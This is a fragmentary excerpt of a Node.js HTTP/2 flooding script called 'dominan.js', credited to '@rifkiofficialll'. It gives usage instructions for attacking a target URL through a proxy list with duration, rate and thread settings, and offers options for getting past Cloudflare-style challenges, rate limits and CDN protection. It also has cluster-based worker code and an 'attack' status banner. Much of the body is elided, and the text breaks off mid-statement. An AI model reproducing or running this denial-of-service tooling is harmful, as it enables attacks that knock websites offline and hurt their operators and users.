...
const docss = `
All the parameters written below all work, so please pay attention. This method is a method that can be customized, almost anything can be customized, the parameter behind it using "--example" is an optional parameter, this method uses rststream to cancel each request. greetings from @rifkiofficialll
...
Usage: node dominan.js GET https://rifkiofficialll.com 260 5 32 proxy.txt --httpver "h2" --bfm true --ratelimit true --uam true --debug true --randrate true --cdn true
`;
...
const agentbokep = new https.Agent({
 ...
 if (enabled('precheck')) {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      console.clear();
      console.log('Running Attack Powered By dominan');
...
if (cluster.isMaster) {
    ...
    console.log(`
        ...
        \x1b[3;31;40m                    \x1b[1;37mAttack order sent by: RIFKIOFFICIALLL
        ...
        \x1b[3;31;40m               \x1b[38;5;85mScript    : \x1b[0m\x1b[38;5;46mDOMINAN×HTTP2\x1b[0m
    ...
    function displayDebugInfo(statuses, startTime, totalTime) {
        ...
        console.log('├──────────┴──────────┤');
        console.log(
            ' \x1b[0m\x1b[38;5;46mDOMINAN×HTTP2\x1b[0m │'
          );      
        console.log('└──────────┴──────────┘');
    }
    ...
    setTimeout(() => process.exit(p), time * 1000);
}
setTimeout(() => {
